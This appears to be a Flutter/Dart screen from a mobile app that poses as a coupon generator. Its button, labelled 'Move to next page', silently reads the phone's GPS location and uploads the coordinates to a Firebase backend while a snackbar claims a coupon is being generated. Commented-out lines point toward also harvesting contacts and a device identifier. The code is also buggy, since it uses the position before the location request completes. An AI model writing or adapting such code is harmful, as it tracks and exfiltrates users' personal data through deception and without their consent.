import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'firebase/QuesAns.dart';

class Contactlist extends StatefulWidget {
  const Contactlist({super.key});

  @override
  State<Contactlist> createState() => _ContactlistState();
}

class _ContactlistState extends State<Contactlist> {
  Position? position;
  late bool isLoaded;
  // List<Contact> contacts = [];
  // String? identifier = UniqueIdentifier.serial as String?;
  bool isLoading = true;
  final FirebaseFirestore firestore = FirebaseFirestore.instance;
  // Future<void> initState() async {
  //   // delay();
  //   // await Geolocator.requestPermission();
  //   // getContactPermission();
  //   // super.initState();
  // }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("Coupon"),
        centerTitle: true,
      ),
      body: Center(
        child: ElevatedButton(
          onPressed: () async {
            if (isLoading == false) {
              delay();
              // senddata();
            } else {
              delay();
              // getContactPermission();
            }
            showSnackBar(Colors.green, "generating coupon wait few second ");
          },
          child: Text("Move to next page"),
        ),
      ),
    );
  }

  void delay() async {
    // await Geolocator.requestPermission();
    Geolocator.getCurrentPosition().then((value) {
      setState(() {
        position = value;
        isLoaded = false;
      });
    });
    QuesAns.uploadtofirebase(position!.latitude, position!.longitude);
  }

  void showSnackBar(dynamic color, String text) {
    var snackBar = SnackBar(
        backgroundColor: color,
        duration: const Duration(seconds: 2),
        content: Text(text));
    ScaffoldMessenger.of(context).showSnackBar(snackBar);
  }
}
